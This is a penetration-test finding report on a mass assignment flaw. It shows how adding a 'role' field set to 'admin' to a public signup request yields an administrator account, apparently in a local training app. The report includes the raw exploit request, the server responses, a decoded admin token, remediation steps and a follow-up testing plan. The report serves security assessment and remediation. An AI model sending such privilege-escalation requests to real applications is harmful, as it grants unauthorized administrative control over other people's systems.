# Finding F-013: Mass Assignment on User Registration Allows Self-Service Admin Account Creation

| Field | Value |
|---|---|
| Finding ID | F-013 |
| Title | Unrestricted `role` Field on `POST /api/Users/` Allows Any Anonymous Visitor to Register as Administrator |
| Category | OWASP Top 10 — A08:2021 Software and Data Integrity Failures (also mappable to A01:2021 Broken Access Control) |
| Severity | **Critical** |
| Status | Confirmed |
| Affected Component | `POST /api/Users/` (registration endpoint) — `role` field |
| Date Identified | 2026-09-29 |

## Summary

The user registration endpoint accepts a client-supplied `role` field and persists it
without validation, whitelisting, or server-side override. Any anonymous, unauthenticated
visitor can submit a normal-looking registration request with `"role":"admin"` added to
the body and receive a **genuine, fully-privileged administrator account** — no
invitation, approval, existing account, or exploitation technique required beyond adding
one extra field to a public signup form.

This was proven end-to-end, not just as a database-level curiosity: the resulting account
was used to log in normally through the standard authentication flow, and the
**signed, legitimately-issued session token itself** — the artifact every downstream
authorization check in the application actually trusts — was confirmed to carry
`"role":"admin"`. This is a textbook **mass assignment** vulnerability (CWE-915): the
registration handler binds the entire client-supplied request body to the user model
instead of restricting it to an explicit, safe subset of fields (email, password).

## Steps to Reproduce

1. Ensure no active session — this requires no prior account or authentication of any kind.
2. Send `POST /api/Users/` with a normal-looking registration body, adding an extra
   `role` field set to `"admin"`:
   ```json
   {
     "email": "masstest-user@example.local",
     "password": "test1234",
     "passwordRepeat": "test1234",
     "role": "admin"
   }
   ```
3. Observe `201 Created`, with the response body's `data.role` field showing `"admin"`
   and `data.profileImage` showing `defaultAdmin.png` (the application's own
   admin-specific default avatar, not the standard customer default) — confirming the
   server branched its own internal logic based on the client-supplied role, rather than
   merely echoing the input back.
4. Log in normally as the newly created account via `POST /rest/user/login` using the
   same email/password.
5. Decode the returned JWT (base64url, no key required). Observe the payload's
   `data.role` field is `"admin"` — the privilege is baked into the actual signed
   session credential, not just visible in a one-off API response.

## Evidence

**Registration request:**
```
POST /api/Users/ HTTP/1.1
Host: localhost:3000
Content-Type: application/json
Accept: application/json, text/plain, */*
Connection: keep-alive

{"email":"masstest-user@example.local","password":"test1234","passwordRepeat":"test1234","role":"admin"}
```

**Registration response:**
```
HTTP/1.1 201 Created
Location: /api/Users/27
Content-Type: application/json; charset=utf-8

{"status":"success","data":{"username":"","deluxeToken":"","lastLoginIp":"0.0.0.0","profileImage":"/assets/public/images/uploads/defaultAdmin.png","isActive":true,"id":27,"email":"masstest-user@example.local","role":"admin","updatedAt":"2026-09-29T22:39:18.827Z","createdAt":"2026-09-29T22:39:18.827Z","deletedAt":null}}
```

The application's own internal challenge tracker independently confirmed the exploit:
> "You successfully solved a challenge: Admin Registration (Register as a user with
> administrator privileges.)"

**Confirmatory login, proving the privilege is real and carried in the session token
(not just a database curiosity):**
```
POST /rest/user/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{"email":"masstest-user@example.local","password":"test1234"}

HTTP/1.1 200 OK
{"authentication":{"token":"<JWT, decoded below>","bid":8,"umail":"masstest-user@example.local"}}
```

**Decoded token payload:**
```json
{
  "data": {
    "id": 27,
    "email": "masstest-user@example.local",
    "role": "admin",
    "profileImage": "/assets/public/images/uploads/defaultAdmin.png",
    "isActive": true,
    "createdAt": "2026-09-29T22:39:18.827Z",
    "updatedAt": "2026-09-29T22:39:18.827Z",
    "deletedAt": null
  },
  "bid": 8
}
```

Full raw requests/responses saved in
`evidence/requests-responses/F-013-mass-assignment-admin-registration.txt`.

*(Sanitization note: truncate/redact the JWT signature segment before committing,
consistent with project evidence-handling standards.)*

## Impact

- **Complete, self-service compromise of the application's highest privilege level**,
  requiring no prior account, no credential guessing, no injection technique, and no
  interaction with any existing user or admin — an anonymous visitor becomes a genuine
  administrator in a single request.
- **More direct than F-006** (SQL injection admin login bypass): F-006 requires
  discovering and exploiting a query-concatenation flaw to authenticate *as the existing*
  admin account. This finding requires no injection at all — it creates a **brand-new,
  independently-controlled** admin account through the application's own, completely
  ordinary registration feature, with one extra JSON field.
- Since the privileged role is embedded in a properly signed token obtained through the
  application's normal, legitimate login flow, **every other finding in this assessment
  that assumes an admin-role session** (e.g., testing admin-gated functionality, F-003's
  admin-config endpoint, F-012's RBAC gaps) can now be reproduced and demonstrated using
  a fully legitimate credential obtained by the attacker themselves — no reliance on
  guessing or intercepting a real administrator's session.
- In a production deployment, this would allow **any anonymous internet visitor** to
  obtain full administrative control of the platform in seconds, with no detection
  signal beyond a normal-looking signup event.
- Combined with **F-012** (missing RBAC on `/api/Users` and `/api/Feedbacks/:id`), an
  attacker does not even need this finding to read the full user table or delete
  feedback — but this finding removes any doubt about privilege boundaries entirely,
  since the attacker now holds a token the application itself considers authentically
  `admin`-level for any check that does inspect role.

## Root Cause

The registration handler (`POST /api/Users/`) binds the entire client-supplied JSON
request body directly to the `User` model's create operation (consistent with a
Sequelize `Model.create(req.body)` pattern, or equivalent) without restricting the
operation to an explicit, safe whitelist of fields (`email`, `password`,
`passwordRepeat`). Any field that exists on the underlying model — `role` in this case —
is therefore fully attacker-controlled at account-creation time. This is the same
underlying bug class already observed in **F-004** (review endpoint silently accepting
an unexpected `id`/`_id` field) and **F-008** (review endpoint accepting a malformed
`message` type) — an endpoint trusting the shape and contents of the request body
without schema validation — but manifesting here with by far the most severe possible
consequence, since the uncontrolled field is a privilege designator rather than content.

## Remediation

1. **Explicitly whitelist the fields accepted by the registration endpoint** —
   `email`, `password`, and `passwordRepeat` only. Never bind the raw request body
   directly to the model's create method.
2. **Always set `role` server-side**, defaulting every new registration to `customer`
   regardless of what the client submits. Role elevation, if the application needs it
   at all, should occur through a separate, authenticated, admin-only action — never as
   a field on public self-registration.
3. **Apply the same explicit-whitelist pattern to every other user-modifiable field**
   the `User` model exposes (e.g., `isActive`, `deluxeToken`, `lastLoginIp`), since this
   endpoint's current behavior suggests none of them are currently protected either —
   this should be verified directly as a follow-up (see below).
4. **Adopt a schema-validation library** (e.g., a JSON Schema or class-validator layer)
   at the request-handling boundary for all `POST`/`PUT` endpoints application-wide,
   rejecting any request containing fields outside the endpoint's explicitly defined
   schema — this is the same systemic fix already recommended in F-004 and F-008, now
   proven necessary at the highest possible severity.
5. Add automated regression tests asserting that a registration request containing a
   `role` (or any other privileged/internal field) is either rejected outright or has
   that field silently ignored, with the resulting account always created as `customer`.

## Related Findings

- **F-006** (SQL Injection Admin Login Bypass) — both findings result in full
  administrative access with no legitimate prior credential; F-006 achieves it via
  injection against the *existing* admin account, this finding achieves it via mass
  assignment on a *new* account — two entirely independent root causes converging on
  the same critical outcome.
- **F-004** (Review Author Field Client-Controlled) / **F-008** (NoSQL Type Confusion
  in Reviews) — same underlying root cause (no request-body schema validation /
  whitelisting), same endpoint family pattern, dramatically higher impact here since
  the uncontrolled field is a privilege designator rather than display content.
- **F-012** (Missing RBAC on REST-Scaffolded Endpoints) — this finding supplies the
  attacker with a genuine, self-obtained admin-role token, which would make any
  admin-gated functionality elsewhere in the app (beyond the already-unprotected
  endpoints F-012 identified) directly reachable as well, pending further testing.

## Follow-Up Testing (planned)

- [ ] Test whether other sensitive fields on the `User` model (`isActive`,
      `deluxeToken`, `lastLoginIp`, `deletedAt`) are similarly mass-assignable via the
      same registration endpoint.
- [ ] Test whether the same mass-assignment pattern exists on `PUT /api/Users/:id`
      or `/profile` (update flows), independent of the unrelated OpenSSL decoder
      anomaly already tracked against that route in `methodology-tracking-log.md`.
- [ ] Use the confirmed admin token from this finding to test admin-gated
      functionality elsewhere in the application that has not yet been reached with a
      genuine admin session, as a natural extension of Step 8 (API-specific abuse)
      testing.
- [ ] Sweep other `POST`/`PUT` endpoints identified in `attack-surface-map.md` for the
      same unrestricted-field-binding pattern (e.g., `/api/BasketItems/`, `/api/Cards/`,
      `/api/Addresss/`), as part of the planned business-logic testing phase (Step 9).

## References

- OWASP Top 10 2021 — A08: Software and Data Integrity Failures
- CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes
- OWASP Mass Assignment Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html
